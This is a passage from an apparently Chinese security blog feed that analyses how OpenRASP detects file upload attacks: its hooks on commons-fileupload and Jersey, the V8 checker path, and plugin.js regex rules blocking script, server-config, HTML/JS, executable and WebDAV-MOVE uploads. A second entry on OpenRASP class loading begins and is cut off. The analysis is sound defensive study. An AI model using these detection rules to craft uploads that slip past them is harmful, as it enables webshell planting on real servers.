class="line">&#125;</span><br><span class="line">        &#125;</span><br><span class="line">&#125; <span class="keyword">catch</span> (Exception e) &#123;</span><br><span class="line">    e.printStackTrace(response.getWriter());</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><h2 id="漏洞修复"><a href="#漏洞修复" class="headerlink" title="漏洞修复"></a>漏洞修复</h2><p>​对于文件上传的防范或修复有以下几种方式：</p><ul><li>对上传的文件进行重命名、自定义后缀等。</li><li>对于上传文件的后缀名截取校验时，忽略大小写，采用统一小写或统一大写的方式进行比对检验。</li><li>严格检测上传文件的类型，推荐采用白名单的形式来检验后缀。</li><li>限制上传文件的大小和上传频率。</li></ul><h2 id="OpenRASP检测流程"><a href="#OpenRASP检测流程" class="headerlink" title="OpenRASP检测流程"></a>OpenRASP检测流程</h2><h3 id="FileUploadItemHook"><a href="#FileUploadItemHook" class="headerlink" title="FileUploadItemHook"></a>FileUploadItemHook</h3><ul><li><p>应用类：org&#x2F;apache&#x2F;commons&#x2F;fileupload&#x2F;disk&#x2F;DiskFileItem类</p></li><li><p>hook类：FileUploadItemHook</p></li></ul><p>​DiskFileItem是FileItem接口的实现类，DiskFileItem#get()用于获取上传文件内容的字节数组，DiskFileItem#write(File file) 将上传文件内容写入到指定文件，DiskFileItem#getInputStream()用于获取上传文件内容的输入流。<br>​在hook类FileUploadItemHook中，hookMethod方法完成以下操作：</p><p>1.将checkFileItemWithBytes检测代码插入到DiskFileItem#get()之后</p><figure class="highlight java"><table><tr><td class="code"><pre><span class="line"><span class="type">String</span> <span class="variable">src</span> <span class="operator">=</span> getInvokeStaticSrc(FileUploadItemHook.class,<span class="string">&quot;checkFileItemWithBytes&quot;</span>, <span class="string">&quot;$0,$_&quot;</span>, Object.class, <span class="type">byte</span>[].class);</span><br><span class="line">insertAfter(ctClass, <span class="string">&quot;get&quot;</span>, <span class="string">&quot;()[B&quot;</span>, src);</span><br></pre></td></tr></table></figure><p>2.将checkFileItemWithStream检测代码插入到DiskFileItem#write(File file) 之前、之后</p><figure class="highlight java"><table><tr><td class="code"><pre><span class="line"><span class="type">String</span> <span class="variable">afterSrc</span> <span class="operator">=</span> getInvokeStaticSrc(FileUploadItemHook.class, <span class="string">&quot;enableFileUploadHook&quot;</span>, <span class="string">&quot;&quot;</span>);</span><br><span class="line">src = getInvokeStaticSrc(FileUploadItemHook.class,<span class="string">&quot;checkFileItemWithStream&quot;</span>, <span class="string">&quot;$0&quot;</span>, Object.class);</span><br><span class="line">insertBefore(ctClass, <span class="string">&quot;write&quot;</span>, <span class="string">&quot;(Ljava/io/File;)V&quot;</span>, src);</span><br><span class="line">insertAfter(ctClass, <span class="string">&quot;write&quot;</span>, <span class="string">&quot;(Ljava/io/File;)V&quot;</span>, afterSrc, <span class="literal">true</span>);               </span><br></pre></td></tr></table></figure><p>3.将checkFileItemWithStream检测代码插入到DiskFileItem#getInputStream()之前、之后</p><figure class="highlight java"><table><tr><td class="code"><pre><span class="line">src = getInvokeStaticSrc(FileUploadItemHook.class,<span class="string">&quot;checkFileItemWithStream&quot;</span>, <span class="string">&quot;$0&quot;</span>, Object.class);</span><br><span class="line">insertBefore(ctClass, <span class="string">&quot;getInputStream&quot;</span>, <span class="string">&quot;()Ljava/io/InputStream;&quot;</span>, src);</span><br><span class="line">insertAfter(ctClass, <span class="string">&quot;getInputStream&quot;</span>, <span class="string">&quot;()Ljava/io/InputStream;&quot;</span>, afterSrc, <span class="literal">true</span>);</span><br></pre></td></tr></table></figure><p>​首先看插入的检测代码checkFileItemWithBytes和checkFileItemWithStream做了什么？</p><figure class="highlight java"><table><tr><td class="code"><pre><span class="line"><span class="comment">//在checkFileItemWithBytes方法中，如果enableFileUploadHook标志位为true，该方法会将字段名、文件名和文件内容放入hashMap，并传递给HookHandler.doCheck方法</span></span><br><span class="line">HashMap&lt;String, Object&gt; params = <span class="keyword">new</span> <span class="title class_">HashMap</span>&lt;String, Object&gt;();</span><br><span class="line">params.put(<span class="string">&quot;name&quot;</span>, name != <span class="literal">null</span> ? name : <span class="string">&quot;&quot;</span>);</span><br><span class="line">params.put(<span class="string">&quot;filename&quot;</span>, filename);</span><br><span class="line">params.put(<span class="string">&quot;content&quot;</span>, <span class="keyword">new</span> <span class="title class_">String</span>(content, getCharSet(item)));</span><br><span class="line">HookHandler.doCheck(CheckParameter.Type.FILEUPLOAD, params);</span><br><span class="line"></span><br><span class="line"><span class="comment">//在checkFileItemWithBytes方法中，会直接调用DiskFileItem#get()方法，因为该方法已经被插入checkFileItemWithBytes检测代码，并将enableFileUploadHook标志位设为false</span></span><br><span class="line">Reflection.invokeMethod(item, <span class="string">&quot;get&quot;</span>, <span class="keyword">new</span> <span class="title class_">Class</span>[]&#123;&#125;);</span><br><span class="line">enableFileUploadHook.set(<span class="literal">false</span>);</span><br><span class="line"></span><br><span class="line"><span class="comment">//enableFileUploadHook方法，将标志位恢复为true</span></span><br><span class="line">enableFileUploadHook.set(<span class="literal">true</span>)</span><br></pre></td></tr></table></figure><p>​现在就很容易理解，为什么要在write和getInputStream方法添加这么多检测代码，是因为这两方法插入的都是反射执行DiskFileItem#get，get方法中调用检测代码checkFileItemWithBytes，检测完毕后将enableFileUploadHook标志位设置为false，从而在write和getInputStream方法运行自身逻辑期间，当前线程是不需要再次进入检测，自身逻辑执行完毕后，通过插入的enableFileUploadHook方法将该标志位重新设置为true。</p><figure class="highlight java"><table><tr><td class="code"><pre><span class="line">HookHandler.doCheck(CheckParameter.Type.FILEUPLOAD, params);</span><br><span class="line">------------------------------------------------------------------------</span><br><span class="line">FILEUPLOAD(<span class="string">&quot;fileUpload&quot;</span>, <span class="keyword">new</span> <span class="title class_">V8AttackChecker</span>(), <span class="number">1</span> &lt;&lt; <span class="number">7</span>);</span><br></pre></td></tr></table></figure><p>​继续观察checkFileItemWithBytes检测代码，将字段名、文件名和文件内容放入params后，调用HookHandler.doCheck，从初始化时寄存的映射关系CheckerManager.checkers中找到”fileUpload”对应的V8AttackChecker，执行流最终到JS.Check方法。</p><figure class="highlight java"><table><tr><td class="code"><pre><span class="line"><span class="comment">//JS.Check实现逻辑拆解如下：  (位于plugin.js.JS)</span></span><br><span class="line">JsonStream.serialize(checkParameter.getParams(), out);<span class="comment">//将获取的参数(字段名、文件名、文件内容)序列化</span></span><br><span class="line">...</span><br><span class="line"><span class="keyword">if</span> (type == Type.DIRECTORY || type == Type.READFILE || type == Type.WRITEFILE || type == Type.SQL</span><br><span class="line">                || type == Type.SSRF) &#123;</span><br><span class="line">    ...</span><br><span class="line">    <span class="comment">//如果LRU缓存中存在该方法参数，则直接返回null，即没问题不阻止</span></span><br><span class="line">    <span class="keyword">if</span> (Config.commonLRUCache.isContainsKey(hashData)) &#123;</span><br><span class="line">                <span class="keyword">return</span> <span class="literal">null</span>;</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br><span class="line">...</span><br><span class="line"><span class="comment">//调用Native方法V8.Check，进入C++执行逻辑，使用js文件中的检测规则进行检测</span></span><br><span class="line">results = V8.Check(type.getName(), out.getByteArray(), out.size(), <span class="keyword">new</span> <span class="title class_">Context</span>(checkParameter.getRequest()),</span><br><span class="line">                    (<span class="type">int</span>) Config.getConfig().getPluginTimeout());</span><br><span class="line">...</span><br><span class="line"><span class="comment">//如果results为null，说明没问题，就把当前方法参数的hash值放入LRU缓存，并直接返回null</span></span><br><span class="line">Config.commonLRUCache.put(hashData, <span class="literal">null</span>);   <span class="comment">//放入缓存，下次默认该参数无害不用再检测</span></span><br><span class="line">...</span><br><span class="line"><span class="comment">//走到这还没return，说明检测到问题，将results以json格式解析，并将检测插件名称、描述信息、行为、检测算法、请求地址、isBlock等信息放入attackInfos并返回</span></span><br><span class="line"><span class="type">JsonArray</span> <span class="variable">j</span> <span class="operator">=</span> <span class="keyword">new</span> <span class="title class_">JsonParser</span>().parse(<span class="keyword">new</span> <span class="title class_">String</span>(results, <span class="string">&quot;UTF-8&quot;</span>)).getAsJsonArray();</span><br><span class="line">attackInfos.add(<span class="keyword">new</span> <span class="title class_">AttackInfo</span>(checkParameter, action, message, name, confidence, algorithm, params, obj));</span><br><span class="line"><span class="keyword">return</span> attackInfos;</span><br></pre></td></tr></table></figure><p>​最终，JS.Check返回的attackInfos会被记录在rasp&#x2F;logs&#x2F;alarm&#x2F;alarm.log，isBlock被解析出来为true，执行流进入HookHandler#handleBlock方法，通过HttpServletResponse#sendError方法返回小恐龙页面。并抛出SecurityException异常。</p><figure class="highlight java"><table><tr><td class="code"><pre><span class="line"><span class="comment">//最终，attackInfos被记录在rasp/logs/alarm/alarm.log （位于AttackCheckListener#onCheckUpdate方法）</span></span><br><span class="line"><span class="type">Logger</span> <span class="variable">ATTACK_ALARM_LOGGER</span> <span class="operator">=</span> Logger.getLogger(AbstractChecker.class.getPackage().getName() + <span class="string">&quot;.alarm&quot;</span>);</span><br><span class="line">Checker.ATTACK_ALARM_LOGGER.info(info);  <span class="comment">//(位于plugin.checker.AttackCheckListener)</span></span><br><span class="line">------------------------------------------------------------------------</span><br><span class="line"><span class="comment">//isBlock会被解析出来，通过HttpServletResponse#sendError方法返回小恐龙页面 （位于HookHandler#handleBlock方法）</span></span><br><span class="line"><span class="type">SecurityException</span> <span class="variable">securityException</span> <span class="operator">=</span> <span class="keyword">new</span> <span class="title class_">SecurityException</span>(<span class="string">&quot;Request blocked by OpenRASP&quot;</span>);</span><br><span class="line"><span class="keyword">if</span> (responseCache.get() != <span class="literal">null</span>) &#123;</span><br><span class="line">    responseCache.get().sendError(parameter);</span><br><span class="line">&#125;</span><br><span class="line"><span class="keyword">throw</span> securityException;</span><br></pre></td></tr></table></figure><p>​至此，commons.fileupload 方式的文件上传分析完毕，因为是这一系列的第一个，做得尽可能详细些，后面其他类型web漏洞的检测逻辑，主要关注hook的应用类及其方法，传递给checker的params，以及V8AttackChecker等检测器check方法实现。可以看到这部分没有进入Native方法V8.Check进行分析，主要是自己对JNI也是涉猎不深，这部分实现对params参数的真正检测，必然是需要学习的重点，将在对web漏洞全面回顾后进行深究。这里留下疑问：</p><blockquote><p>native方法V8.Check是怎样实现的，如何处理文件上传问题？如果在自己的项目里实现一般native方法？</p></blockquote><h3 id="FileUploadHook"><a href="#FileUploadHook" class="headerlink" title="FileUploadHook"></a>FileUploadHook</h3><p>应用类：org&#x2F;apache&#x2F;commons&#x2F;fileupload&#x2F;FileUploadBase</p><p>hook类：FileUploadHook</p><p>​同样是监控commons.fileupload 方式的文件上传，检测代码cacheFileUploadParam实现了，将上传文件的字段名和文件名放入HookHandler.requestCache的属性formItemCache和fileParamCache寄存器起来，没有其他操作。</p><figure class="highlight java"><table><tr><td class="code"><pre><span class="line"><span class="type">String</span> <span class="variable">src</span> <span class="operator">=</span> getInvokeStaticSrc(FileUploadHook.class, <span class="string">&quot;cacheFileUploadParam&quot;</span>, <span class="string">&quot;$_&quot;</span>, Object.class);</span><br><span class="line">insertAfter(ctClass, <span class="string">&quot;parseRequest&quot;</span>, <span class="literal">null</span>, src);</span><br><span class="line">------------------------------------------------------------------------</span><br><span class="line">（位于FileUploadHook#cacheFileUploadParam方法）</span><br><span class="line">HookHandler.requestCache.get().setFormItemCache(formItemCache);</span><br><span class="line">HookHandler.requestCache.get().setFileParamCache(fileItemCache);</span><br></pre></td></tr></table></figure><h3 id="JerseyMultipart"><a href="#JerseyMultipart" class="headerlink" title="JerseyMultipart"></a>JerseyMultipart</h3><p>应用类：org&#x2F;glassfish&#x2F;jersey&#x2F;media&#x2F;multipart&#x2F;FormDataMultiPart</p><p>hook类：JerseyMultipart</p><p>​监控Jersey框架实现文件上传，将检测代码checkFileUpload插入到FormDataMultiPart#getFields方法后，检测逻辑是将文件名和文件内容放入params，传递给HookHandler.doCheck方法。</p><figure class="highlight java"><table><tr><td class="code"><pre><span class="line"><span class="type">String</span> <span class="variable">src</span> <span class="operator">=</span> getInvokeStaticSrc(JerseyMultipart.class, <span class="string">&quot;checkFileUpload&quot;</span>, <span class="string">&quot;$_&quot;</span>, Object.class);</span><br><span class="line">insertAfter(ctClass, <span class="string">&quot;getFields&quot;</span>, <span class="string">&quot;()Ljava/util/Map;&quot;</span>, src);</span><br><span class="line">------------------------------------------------------------------------</span><br><span class="line">（位于JerseyMultipart#checkFileUpload方法）</span><br><span class="line">HashMap&lt;String, Object&gt; params = <span class="keyword">new</span> <span class="title class_">HashMap</span>&lt;String, Object&gt;();</span><br><span class="line">params.put(<span class="string">&quot;filename&quot;</span>, name);</span><br><span class="line">params.put(<span class="string">&quot;content&quot;</span>, <span class="keyword">new</span> <span class="title class_">String</span>(content));</span><br><span class="line">params.put(<span class="string">&quot;name&quot;</span>, <span class="string">&quot;&quot;</span>);</span><br><span class="line">HookHandler.doCheck(CheckParameter.Type.FILEUPLOAD, params);</span><br></pre></td></tr></table></figure><h2 id="文件上传漏洞检测算法"><a href="#文件上传漏洞检测算法" class="headerlink" title="文件上传漏洞检测算法"></a>文件上传漏洞检测算法</h2><p>检测规则位于&#x2F;plugins&#x2F;official&#x2F;plugin.js中，这里汇总js对文件上传的检测规则</p><p>1.控制变量</p><figure class="highlight javascript"><table><tr><td class="code"><pre><span class="line"><span class="comment">// 文件上传 - COPY/MOVE 方式，仅适合 tomcat</span></span><br><span class="line"><span class="attr">fileUpload_webdav</span>: &#123;</span><br><span class="line">    <span class="attr">name</span>:   <span class="string">&#x27;算法1 - MOVE 方式上传脚本文件&#x27;</span>,</span><br><span class="line">    <span class="attr">action</span>: <span class="string">&#x27;block&#x27;</span></span><br><span class="line">&#125;,</span><br><span class="line"><span class="comment">// 文件上传 - Multipart 方式上传脚本文件</span></span><br><span class="line"><span class="attr">fileUpload_multipart_script</span>: &#123;</span><br><span class="line">    <span class="attr">name</span>:   <span class="string">&#x27;算法2 - Multipart 方式上传 PHP/JSP 等脚本文件&#x27;</span>,</span><br><span class="line">    <span class="attr">action</span>: <span class="string">&#x27;block&#x27;</span></span><br><span class="line">&#125;,</span><br><span class="line"><span class="comment">// 文件上传 - Multipart 方式上传 HTML/JS 等文件</span></span><br><span class="line"><span class="attr">fileUpload_multipart_html</span>: &#123;</span><br><span class="line">    <span class="attr">name</span>:   <span class="string">&#x27;算法3 - Multipart 方式上传 HTML/JS 等文件&#x27;</span>,</span><br><span class="line">    <span class="attr">action</span>: <span class="string">&#x27;ignore&#x27;</span></span><br><span class="line">&#125;,</span><br><span class="line"><span class="comment">// 文件上传 - Multipart 方式上传 DLL/EXE 等文件</span></span><br><span class="line"><span class="attr">fileUpload_multipart_exe</span>: &#123;</span><br><span class="line">    <span class="attr">name</span>:   <span class="string">&#x27;算法3 - Multipart 方式上传 DLL/EXE 等文件&#x27;</span>,</span><br><span class="line">    <span class="attr">action</span>: <span class="string">&#x27;ignore&#x27;</span></span><br><span class="line">&#125;,</span><br></pre></td></tr></table></figure><p>2.匹配规则和返回内容</p><figure class="highlight javascript"><table><tr><td class="code"><pre><span class="line">plugin.<span class="title function_">register</span>(<span class="string">&#x27;fileUpload&#x27;</span>, <span class="keyword">function</span> (<span class="params">params, context</span>) &#123;</span><br><span class="line"></span><br><span class="line">    <span class="comment">// 是否禁止使用 multipart 上传脚本文件，或者 apache/php 服务器配置文件</span></span><br><span class="line">    <span class="keyword">if</span> (algorithmConfig.<span class="property">fileUpload_multipart_script</span>.<span class="property">action</span> != <span class="string">&#x27;ignore&#x27;</span>)</span><br><span class="line">    &#123;</span><br><span class="line">        <span class="keyword">if</span> (scriptFileRegex.<span class="title function_">test</span>(params.<span class="property">filename</span>) || ntfsRegex.<span class="title function_">test</span>(params.<span class="property">filename</span>))</span><br><span class="line">        &#123;</span><br><span class="line">            <span class="keyword">return</span> &#123;</span><br><span class="line">                <span class="attr">action</span>:     algorithmConfig.<span class="property">fileUpload_multipart_script</span>.<span class="property">action</span>,</span><br><span class="line">                <span class="attr">message</span>:    <span class="title function_">_</span>(<span class="string">&quot;File upload - Uploading a server-side script file with multipart/form-data protocol, filename: %1%&quot;</span>, [params.<span class="property">filename</span>]),</span><br><span class="line">                <span class="attr">confidence</span>: <span class="number">95</span>,</span><br><span class="line">                <span class="attr">algorithm</span>:  <span class="string">&#x27;fileUpload_multipart_script&#x27;</span></span><br><span class="line">            &#125;</span><br><span class="line">        &#125;</span><br><span class="line"></span><br><span class="line">        <span class="keyword">if</span> (params.<span class="property">filename</span> == <span class="string">&quot;.htaccess&quot;</span> || params.<span class="property">filename</span> == <span class="string">&quot;.user.ini&quot;</span>)</span><br><span class="line">        &#123;</span><br><span class="line">            <span class="keyword">return</span> &#123;</span><br><span class="line">                <span class="attr">action</span>:     algorithmConfig.<span class="property">fileUpload_multipart_script</span>.<span class="property">action</span>,</span><br><span class="line">                <span class="attr">message</span>:    <span class="title function_">_</span>(<span class="string">&quot;File upload - Uploading a server-side config file with multipart/form-data protocol, filename: %1%&quot;</span>, [params.<span class="property">filename</span>]),</span><br><span class="line">                <span class="attr">confidence</span>: <span class="number">95</span>,</span><br><span class="line">                <span class="attr">algorithm</span>:  <span class="string">&#x27;fileUpload_multipart_script&#x27;</span></span><br><span class="line">            &#125;</span><br><span class="line">        &#125;</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="comment">// 是否禁止 HTML/JS 文件，主要是对抗钓鱼、CORS绕过等问题</span></span><br><span class="line">    <span class="keyword">if</span> (algorithmConfig.<span class="property">fileUpload_multipart_html</span>.<span class="property">action</span> != <span class="string">&#x27;ignore&#x27;</span>)</span><br><span class="line">    &#123;</span><br><span class="line">        <span class="keyword">if</span> (htmlFileRegex.<span class="title function_">test</span>(params.<span class="property">filename</span>))</span><br><span class="line">        &#123;</span><br><span class="line">            <span class="keyword">return</span> &#123;</span><br><span class="line">                <span class="attr">action</span>:     algorithmConfig.<span class="property">fileUpload_multipart_html</span>.<span class="property">action</span>,</span><br><span class="line">                <span class="attr">message</span>:    <span class="title function_">_</span>(<span class="string">&quot;File upload - Uploading a HTML/JS file with multipart/form-data protocol, filename: %1%&quot;</span>, [params.<span class="property">filename</span>]),</span><br><span class="line">                <span class="attr">confidence</span>: <span class="number">90</span>,</span><br><span class="line">                <span class="attr">algorithm</span>:  <span class="string">&#x27;fileUpload_multipart_html&#x27;</span></span><br><span class="line">            &#125;</span><br><span class="line">        &#125;</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="comment">// 是否禁止 EXE/DLL 文件，防止被用于后门下载站点</span></span><br><span class="line">    <span class="keyword">if</span> (algorithmConfig.<span class="property">fileUpload_multipart_exe</span>.<span class="property">action</span> != <span class="string">&#x27;ignore&#x27;</span>)</span><br><span class="line">    &#123;</span><br><span class="line">        <span class="keyword">if</span> (exeFileRegex.<span class="title function_">test</span>(params.<span class="property">filename</span>))</span><br><span class="line">        &#123;</span><br><span class="line">            <span class="keyword">return</span> &#123;</span><br><span class="line">                <span class="attr">action</span>:     algorithmConfig.<span class="property">fileUpload_multipart_exe</span>.<span class="property">action</span>,</span><br><span class="line">                <span class="attr">message</span>:    <span class="title function_">_</span>(<span class="string">&quot;File upload - Uploading a Executable file with multipart/form-data protocol, filename: %1%&quot;</span>, [params.<span class="property">filename</span>]),</span><br><span class="line">                <span class="attr">confidence</span>: <span class="number">90</span>,</span><br><span class="line">                <span class="attr">algorithm</span>:  <span class="string">&#x27;fileUpload_multipart_exe&#x27;</span></span><br><span class="line">            &#125;</span><br><span class="line">        &#125;</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="keyword">return</span> clean</span><br><span class="line">&#125;)</span><br><span class="line"></span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="keyword">if</span> (algorithmConfig.<span class="property">fileUpload_webdav</span>.<span class="property">action</span> != <span class="string">&#x27;ignore&#x27;</span>)</span><br><span class="line">&#123;</span><br><span class="line">    plugin.<span class="title function_">register</span>(<span class="string">&#x27;webdav&#x27;</span>, <span class="keyword">function</span> (<span class="params">params, context</span>) &#123;</span><br><span class="line"></span><br><span class="line">        <span class="comment">// 源文件不是脚本 &amp;&amp; 目标文件是脚本，判定为MOVE方式写后门</span></span><br><span class="line">        <span class="keyword">if</span> (! scriptFileRegex.<span class="title function_">test</span>(params.<span class="property">source</span>) &amp;&amp; scriptFileRegex.<span class="title function_">test</span>(params.<span class="property">dest</span>))</span><br><span class="line">        &#123;</span><br><span class="line">            <span class="keyword">return</span> &#123;</span><br><span class="line">                <span class="attr">action</span>:    algorithmConfig.<span class="property">fileUpload_webdav</span>.<span class="property">action</span>,</span><br><span class="line">                <span class="attr">message</span>:   <span class="title function_">_</span>(<span class="string">&quot;File upload - Uploading a server-side script file with HTTP method %1%, file is %2%&quot;</span>, [</span><br><span class="line">                    context.<span class="property">method</span>, params.<span class="property">dest</span></span><br><span class="line">                ]),</span><br><span class="line">                <span class="attr">confidence</span>: <span class="number">100</span>,</span><br><span class="line">                <span class="attr">algorithm</span>:  <span class="string">&#x27;fileUpload_webdav&#x27;</span></span><br><span class="line">            &#125;</span><br><span class="line">        &#125;</span><br><span class="line"></span><br><span class="line">        <span class="keyword">return</span> clean</span><br><span class="line">    &#125;)</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>3.正则表达式</p><figure class="highlight javascript"><table><tr><td class="code"><pre><span class="line"><span class="comment">// 如果你配置了非常规的扩展名映射，比如让 .abc 当做PHP脚本执行，那你可能需要增加更多扩展名</span></span><br><span class="line"><span class="keyword">var</span> scriptFileRegex = <span class="regexp">/\.(aspx?|jspx?|php[345]?|phar|phtml|sh|py|pl|rb)\.?$/i</span></span><br><span class="line"></span><br><span class="line"><span class="comment">// 正常文件</span></span><br><span class="line"><span class="keyword">var</span> cleanFileRegex  = <span class="regexp">/\.(jpg|jpeg|png|gif|bmp|txt|rar|zip)$/i</span></span><br><span class="line"></span><br><span class="line"><span class="comment">// 文件读取扩展名白名单，包含 压缩文件 office文件 图片文件</span></span><br><span class="line"><span class="keyword">var</span> readFileWhiteExt = <span class="keyword">new</span> <span class="title class_">RegExp</span>(<span class="regexp">/\.(do[c|t][x|m|]?|xl[s|t][x|m|b]?|pp[t|s|a][x|m]?|pot[x|m]|7z|tar|gz|bz2|xz|rar|zip|jpg|jpeg|png|gif|bmp|txt|)$/</span>, <span class="string">&#x27;i&#x27;</span>)</span><br><span class="line"></span><br><span class="line"><span class="comment">// 匹配 HTML/JS 等可以用于钓鱼、domain-fronting 的文件</span></span><br><span class="line"><span class="keyword">var</span> htmlFileRegex   = <span class="regexp">/\.(htm|html|js)$/i</span></span><br><span class="line"></span><br><span class="line"><span class="comment">// 匹配 EXE/DLL 等可以执行的文件</span></span><br><span class="line"><span class="keyword">var</span> exeFileRegex    = <span class="regexp">/\.(exe|dll|scr|vbs|cmd|bat)$/i</span></span><br><span class="line"></span><br><span class="line"><span class="comment">// 其他的 stream 都没啥用</span></span><br><span class="line"><span class="keyword">var</span> ntfsRegex       = <span class="regexp">/::\$(DATA|INDEX)$/</span></span><br></pre></td></tr></table></figure><h2 id="参考文章"><a href="#参考文章" class="headerlink" title="参考文章"></a>参考文章</h2><figure class="highlight java"><table><tr><td class="code"><pre><span class="line"><span class="number">1.</span>《Java代码审计实战》</span><br><span class="line"><span class="number">2.</span>《Java代码审计-入门篇》</span><br></pre></td></tr></table></figure>]]></content>
      
      
      <categories>
          
          <category> 安全工具 </category>
          
      </categories>
      
      
        <tags>
            
            <tag> OpenRASP </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>OpenRASP类加载</title>
      <link href="/2022/11/25/OpenRASP%E7%B1%BB%E5%8A%A0%E8%BD%BD/"/>
      <url>/2022/11/25/OpenRASP%E7%B1%BB%E5%8A%A0%E8%BD%BD/</url>
      
        <content type="html"><![CDATA[<h1 id="OpenRASP类加载"><a href="#OpenRASP类加载" class="headerlink" title="OpenRASP类加载"></a>OpenRASP类加载</h1><h2 id="初始化中的类加载"><a href="#初始化中的类加载" class="headerlink" title="初始化中的类加载"></a>初始化中的类加载</h2><p>​在“OpenRASP主线逻辑”中，我们知道rasp.jar的com.baidu.openrasp.Agent$init方法与类加载相关，本篇文章对此展开分析。</p><figure class="highlight java"><table><tr><td class="code"><pre><span class="line"><span class="keyword">public</span> <span class="keyword">static</span> <span class="keyword">synchronized</span> <span class="keyword">void</span> <span class="title function_">init</span><span class="params">(String mode, String action, Instrumentation inst)</span> &#123;</span><br><span class="line">    <span class="keyword">try</span> &#123;</span><br><span class="line">        JarFileHelper.addJarToBootstrap(inst);</span><br><span class="line">        readVersion();<span class="comment">//读取MANIFEST.MF相关信息</span></span><br><span class="line">        ModuleLoader.load(mode, action, inst);</span><br><span class="line">    &#125; <span class="keyword">catch</span> (Throwable e) &#123;</span><br><span class="line">        System.err.println(<span class="string">&quot;[OpenRASP] Failed to initialize, will continue without security protection.&quot;</span>);</span><br><span class="line">        e.printStackTrace();</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br><span class="line">------------------------------------------------------------------------</span><br><span class="line">ModuleLoader.load(mode, action, inst);   <span class="comment">//类方法</span></span><br><span class="line">-&gt; instance = <span class="keyword">new</span> <span class="title class_">ModuleLoader</span>(mode, inst);</span><br><span class="line">-&gt; engineContainer = <span class="keyword">new</span> <span class="title class_">ModuleContainer</span>(ENGINE_JAR);</span><br><span class="line">   engineContainer.start(mode, inst);</span><br></pre></td></tr></table></figure><p>1.addJarToBootstrap(inst)：将rasp.jar添加到BootStrap classpath，使得rasp.jar中的类被BootstrapClassLoader加载；</p><blockquote><p>把rasp.jar添加到BootstrapClassLoader的classpath上，当Bootstrap ClassLoader检查自身加载过的类，发现没有找到目标类时，会在指定的jar文件中搜索。</p></blockquote><blockquote><p>官方文档也做了如下解释：</p><p>当去 hook 像 <code>java.io.File</code> 这样由 <code>BootstrapClassLoader</code> 加载的类的时候，无法从该类调用非 <code>BootstrapClassLoader</code> 加载的类中的接口，所以 <code>agent.jar</code> 会先将自己添加到 <code>BootstrapClassLoader</code> 的ClassPath下，这样 hook 由 <code>BootstrapClassLoader</code> 加载的类的时候就能够成功调用到 <code>agent.jar</code> 中的检测入口</p></blockquote><p>2.ModuleLoader.load(mode, action, inst)：实现了加载rasp-engine.jar，并调用入口类EngineBoot$start，将执行流交给rasp-engine.jar。并将加载rasp-engine.jar的加载器寄存在rasp.jar的ModuleLoader.moduleClassLoader。</p><p>​在ModuleLoader的静态代码块中，通过while循环获取了扩展类加载器（sun.misc.Launcher$ExtClassLoader），将ExtClassLoader寄存在ModuleLoader.moduleClassLoader属性，以供接下来使用。</p><figure class="highlight java"><table><tr><td class="code"><pre><span class="line"><span class="keyword">static</span> &#123;</span><br><span class="line">    ......</span><br><span class="line">    <span class="type">ClassLoader</span> <span class="variable">systemClassLoader</span> <span class="operator">=</span> ClassLoader.getSystemClassLoader();</span><br><span class="line">    <span class="keyword">while</span> (systemClassLoader.getParent() != <span class="literal">null</span></span><br><span class="line">           &amp;&amp; !systemClassLoader.getClass().getName().equals(<span class="string">&quot;sun.misc.Launcher$ExtClassLoader&quot;</span>)) &#123;</span><br><span class="line">        systemClassLoader = systemClassLoader.getParent();</span><br><span class="line">    &#125;</span><br><span class="line">    moduleClassLoader = systemClassLoader;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><blockquote><p>​ExtClassLoader是我们能获取到最高级的类加载器了，通过systemClassLoader.getParent获取父加载器时，ExtClassLoader.getParent会返回null，因为BootstrapClassLoader是C++实现不能获取。</p></blockquote><p>​容器类ModuleContainer在实例化时加载engine，参数jarName为”rasp-engine.jar”。程序先获取到jar包的全路径，根据前面解析MANIFEST.MF得到的attributes获知jar包的模块名和入口类名，接下来是分情况将rasp-engine.jar添加到classpath，并加载其入口类。</p><figure class="highlight java"><table><tr><td class="code"><pre><span class="line"><span class="keyword">public</span> <span class="title function_">ModuleContainer</span><span class="params">(String jarName)</span> <span class="keyword">throws</span> Throwable &#123;</span><br><span class="line">    <span class="keyword">try</span> &#123;</span><br><span class="line">        <span class="type">File</span> <span class="variable">originFile</span> <span class="operator">=</span> <span class="keyword">new</span> <span class="title class_">File</span>(baseDirectory + File.separator + jarName);</span><br><span class="line">        <span class="type">JarFile</span> <span class="variable">jarFile</span> <span class="operator">=</span> <span class="keyword">new</span> <span class="title class_">JarFile</span>(originFile);</span><br><span class="line">        <span class="type">Attributes</span> <span class="variable">attributes</span> <span class="operator">=</span> jarFile.getManifest().getMainAttributes();</span><br><span class="line">        jarFile.close();</span><br><span class="line">        <span class="built_in">this</span>.moduleName = attributes.getValue(<span class="string">&quot;Rasp-Module-Name&quot;</span>);</span><br><span class="line">        <span class="type">String</span> <span class="variable">moduleEnterClassName</span> <span class="operator">=</span> attributes.getValue(<span class="string">&quot;Rasp-Module-Class&quot;</span>);</span><br><span class="line">        <span class="keyword">if</span> (moduleName != <span class="literal">null</span> &amp;&amp; moduleEnterClassName != <span class="literal">null</span></span><br><span class="line">                &amp;&amp; !moduleName.equals(<span class="string">&quot;&quot;</span>) &amp;&amp; !moduleEnterClassName.equals(<span class="string">&quot;&quot;</span>)) &#123;</span><br><span class="line">            Class moduleClass;</span><br><span class="line">            <span class="keyword">if</span> (ClassLoader.getSystemClassLoader() <span class="keyword">instanceof</span> URLClassLoader) &#123;</span><br><span class="line">                <span class="type">Method</span> <span class="variable">method</span> <span class="operator">=</span> Class.forName(<span class="string">&quot;java.net.URLClassLoader&quot;</span>).getDeclaredMethod(<span class="string">&quot;addURL&quot;</span>, URL.class);</span><br><span class="line">                method.setAccessible(<span class="literal">true</span>);</span><br><span class="line">                method.invoke(moduleClassLoader, originFile.toURI().toURL());</span><br><span class="line">                method.invoke(ClassLoader.getSystemClassLoader(), originFile.toURI().toURL());</span><br><span class="line">                moduleClass = 